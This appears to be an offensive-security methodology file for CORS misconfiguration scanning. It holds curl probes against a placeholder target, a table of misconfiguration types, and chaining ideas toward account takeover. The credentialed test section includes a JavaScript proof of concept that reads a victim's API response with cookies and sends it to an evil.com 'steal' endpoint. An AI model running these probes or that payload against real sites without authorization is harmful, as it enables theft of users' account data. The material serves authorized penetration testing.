---
name: recon-10-cors-scan
sequence: recon-10
category: recon
domain: recon
description: "CORS misconfiguration scanning: origin reflection, null origin, wildcard with credentials, preflight bypass, trusted origin check, dynamic origin detection, cross-origin data exfiltration testing."
wordlist_ref: "wordlists/recon/"
---

# Recon 10 Cors Scan — Offensive Methodology

## Quick Workflow
1. Send request with arbitrary Origin (Origin: https://evil.com)
2. Check if ACAO reflects the origin
3. Check if ACAC (credentials) is true
4. Test Null Origin, subdomain trusted origins
5. Test preflight bypass
6. Determine CORS misconfig type

---

## Hacker Mindset
**CORS bugs let attackers bypass Same-Origin Policy.** That means reading API responses cross-origin. If there's also no auth on the endpoint, it's a data leak. If there IS auth, CORS + credentialed requests = full account data theft.

---

## Detection

### Basic CORS Test
```bash
# Test with arbitrary origin
curl -s -D - "https://target.com/api/user" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=valid" \
  -o /dev/null | grep -i "access-control"
```

### CORS Misconfig Types
| Type | Request | Response | Severity |
|------|---------|----------|----------|
| Origin Reflection | `Origin: https://evil.com` | `ACAO: https://evil.com` + `ACAC: true` | **Critical** — data theft |
| Wildcard | `Origin: anything` | `ACAO: *` (no ACAC) | Medium — public data only |
| Null Origin | `Origin: null` | `ACAO: null` | **Critical** — sandbox bypass |
| Trusted Prefix | `Origin: https://evil.com.target.com` | ACAO reflects | High — domain confusion |
| Subdomain Trust | `Origin: https://evil.target.com` | ACAO reflects | High — if subdomain takeoverable |
| Preflight Bypass | OPTIONS with arbitrary origin | ACAO + ACAC | **Critical** — no preflight needed |

### Origin Reflection Test
```bash
# Test if ACAO reflects the Origin header
origins=("https://evil.com" "https://attacker.com" "null" "https://target.com.evil.com" "https://eviltarget.com")

for origin in "${origins[@]}"; do
  echo "=== Testing Origin: $origin ==="
  curl -s -D - "https://target.com/api/sensitive" \
    -H "Origin: $origin" \
    -o /dev/null | grep -i "access-control"
done
```

### Credentialed CORS Test
```bash
# If ACAO reflects AND ACAC: true
# AND response contains session-specific data
# → Critical: attacker.com reads victim's data via JS fetch

# Proof of concept:
"""
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/steal?d=' + btoa(d)))
</script>
"""
```

### Preflight Test
```bash
# Test if preflight OPTIONS also has weak CORS
curl -s -D - -X OPTIONS "https://target.com/api/sensitive" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -o /dev/null | grep -i "access-control\|allow"

# If ACAO reflects on OPTIONS → can bypass some CORS restrictions
```

### Endpoint CORS Variability
```bash
# Different endpoints may have different CORS policies
# /api/ often more permissive than /account/
# /graphql often permissive for introspection
endpoints=("/api/user" "/api/admin" "/account/profile" "/graphql")
for ep in "${endpoints[@]}"; do
  echo "=== $ep ==="
  curl -s -D - "https://target.com$ep" \
    -H "Origin: https://evil.com" \
    -o /dev/null | grep -i "access-control"
done
```

---

## Wordlist Invocation
No wordlist needed for recon-10. Detection is header-manipulation driven.

**Tools:** curl

## Chaining
- Critical CORS + XSS → victim clicks XSS → their session data leaked to attacker
- CORS on sensitive endpoint → session hijack → account takeover
- CORS + CSRF → perform actions cross-origin
- Null CORS + sandbox iframe → bypass restrictions
- Preflight bypass → CORS restricts none
